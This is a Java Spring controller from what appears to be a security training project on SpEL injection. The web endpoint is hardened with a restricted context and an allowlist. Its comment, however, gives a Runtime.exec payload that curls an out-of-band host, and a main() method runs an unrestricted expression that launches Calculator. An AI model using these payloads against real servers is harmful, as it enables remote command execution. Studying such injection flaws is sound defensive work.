package org.joychou.controller;

import org.springframework.expression.ConstructorResolver;
import org.springframework.expression.EvaluationException;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.MethodResolver;
import org.springframework.expression.PropertyAccessor;
import org.springframework.expression.TypeLocator;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.joychou.util.WebUtils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.Collections;
import java.util.regex.Pattern;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    private static final int MAX_EXPRESSION_LENGTH = 100;
    private static final Pattern SAFE_EXPRESSION = Pattern.compile(
            "^[0-9+\\-*/%()<>=!?:. ]*(?:'[a-zA-Z0-9 ]*'[0-9+\\-*/%()<>=!?:. ]*)*$");

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // Locked-down evaluation context (SimpleEvaluationContext is not available in the Spring 4.3.x
        // managed by this Boot version): no type references (T(..)), no constructors, no method
        // invocation, no property access and no bean references. Literals and operators still work.
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setTypeLocator(new TypeLocator() {
            @Override
            public Class<?> findType(String typeName) throws EvaluationException {
                throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
            }
        });
        context.setConstructorResolvers(Collections.<ConstructorResolver>emptyList());
        context.setMethodResolvers(Collections.<MethodResolver>emptyList());
        context.setPropertyAccessors(Collections.<PropertyAccessor>emptyList());
        context.setBeanResolver(null);
        // Expression allowlist: only numbers, operators and single-quoted literals; identifiers (T(..), new,
        // bean names, method names) can never appear outside a quoted literal.
        if (expression == null || expression.length() > MAX_EXPRESSION_LENGTH
                || !SAFE_EXPRESSION.matcher(expression).matches()) {
            return "Bad boy. I got u.";
        }
        return WebUtils.htmlEncode(String.valueOf(parser.parseExpression(expression).getValue(context)));
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

